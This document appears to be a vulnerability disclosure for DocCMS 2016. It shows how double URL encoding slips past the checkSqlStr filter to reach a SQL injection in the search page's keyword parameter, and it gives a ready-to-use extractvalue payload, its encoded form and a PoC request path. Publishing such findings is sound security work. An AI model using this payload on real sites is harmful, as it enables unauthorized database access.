# Summary
DocCMS2016(http://doccms.com/?p=40) has a SQL injection vulnerability at `/search/index.php?keyword`.

# Analyze
You can get the source code of the website here: https://gitee.com/husky/DocCMS/releases/download/2016/DocCms-20160517.rar

In `content\search\index.php`:
![image](https://github.com/user-attachments/assets/8d470560-22d2-4d7c-8198-b640d625254e)


There is a `checkSqlStr` filter for sql query statements:
![image](https://github.com/user-attachments/assets/b68311a2-2678-4272-81b2-74fe90f21a7f)

However, just below the check, a urldecode is done, we can double url encode the payload to bypass the waf:
![image](https://github.com/user-attachments/assets/36d41b31-f4a9-4fa5-8725-a31fa4f3382a)

# Details
Normal keyword search:
![image](https://github.com/user-attachments/assets/fec26571-6b36-4390-a9fd-c0fa520d7ba2)

We use this sql injection payload: 
```
1' and extractvalue(1,concat(0x7e,(select database()),0x7e)) -- -
```
Then double url encode:
![image](https://github.com/user-attachments/assets/9e4dffa1-7f4f-4849-9564-2758477d9256)
```
1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%36%34%25%36%31%25%37%34%25%36%31%25%36%32%25%36%31%25%37%33%25%36%35%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%30%25%32%64%25%32%64%25%32%30%25%32%64
```


![image](https://github.com/user-attachments/assets/3742ed60-443a-4b8d-9609-a92337ccf770)


# PoC
```
/search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%36%34%25%36%31%25%37%34%25%36%31%25%36%32%25%36%31%25%37%33%25%36%35%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%30%25%32%64%25%32%64%25%32%30%25%32%64
```
![image](https://github.com/user-attachments/assets/3742ed60-443a-4b8d-9609-a92337ccf770)
